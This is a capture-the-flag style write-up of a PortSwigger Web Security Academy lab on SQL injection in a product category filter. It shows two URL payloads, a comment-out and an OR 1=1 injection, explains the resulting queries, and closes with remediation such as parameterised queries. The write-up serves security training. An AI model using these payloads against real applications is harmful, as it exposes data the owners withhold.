# SQL Injection in a WHERE Clause: Retrieving Hidden Data

- **Lab:** SQL injection vulnerability in WHERE clause allowing retrieval of hidden data
- **Platform:** PortSwigger Web Security Academy
- **Category:** SQL Injection (OWASP A03:2021, Injection)
- **Difficulty:** Apprentice
- **URL:** https://portswigger.net/web-security/sql-injection/lab-retrieve-hidden-data

## Environment & Scope

Isolated training lab on PortSwigger's Web Security Academy. Each lab runs on a dedicated, disposable instance tied to my own account. No third-party or production systems were involved.

## Objective

The shop filters products by category. For a selected category the back end builds a SQL query such as:

```sql
SELECT * FROM products WHERE category = 'Gifts' AND released = 1
```

The `released = 1` condition hides unreleased products from the catalogue. The goal is to make the application display one or more of these hidden products.

## Reconnaissance

Selecting a category loads a URL of the form:

```
/filter?category=Gifts
```

The `category` value is placed directly into the query's `WHERE` clause with no apparent sanitisation. This makes it a candidate injection point.

## Exploitation

### Attempt 1: comment out the filter

```
/filter?category=Gifts'--
```

Resulting query:

```sql
SELECT * FROM products WHERE category = 'Gifts'--' AND released = 1
```

The `'` closes the string early and `--` comments out the remainder, removing the `AND released = 1` restriction. The injection was syntactically valid and returned every product in the Gifts category. That category contained no unreleased products, so no hidden data surfaced and the lab's success condition was not met. The technique worked. The chosen category simply had nothing hidden to reveal.

### Attempt 2: return everything

```
/filter?category='+OR+1=1--
```

In a URL `+` decodes to a space, so the back end receives `' OR 1=1--`. Resulting query:

```sql
SELECT * FROM products WHERE category = '' OR 1=1--' AND released = 1
```

`OR 1=1` evaluates to true for every row and `--` discards the `released` filter. The catalogue returned every product, released and unreleased alike. **Lab solved.**

## Impact

An unauthenticated visitor can read records the application is designed to withhold. In a real application the same injection point rarely stops at reading hidden rows. It commonly extends to enumerating other tables and extracting user credentials. Depending on the database engine and the account's privileges, it can lead to full compromise of the database.

## Remediation

- **Parameterised queries (prepared statements)** for every database call. User input is bound as a parameter rather than concatenated into the query string, so `category` can never change the query's structure.
- **Input validation / allow-listing** where the valid set is known. Categories are a fixed list, so any value not on that list should be rejected.
- **Least privilege** for the application's database account, to limit the blast radius if an injection is found.
- Do not expose raw database errors to the client.

Fixed query (parameterised):

```sql
SELECT * FROM products WHERE category = ? AND released = 1
```

## Key takeaway

A syntactically successful injection and a solved objective are not the same thing. Confirming the injection point (Attempt 1) and achieving the goal (Attempt 2) are separate steps. Distinguishing them matters when reporting a finding, so the report reflects what was actually proven rather than what was merely attempted.
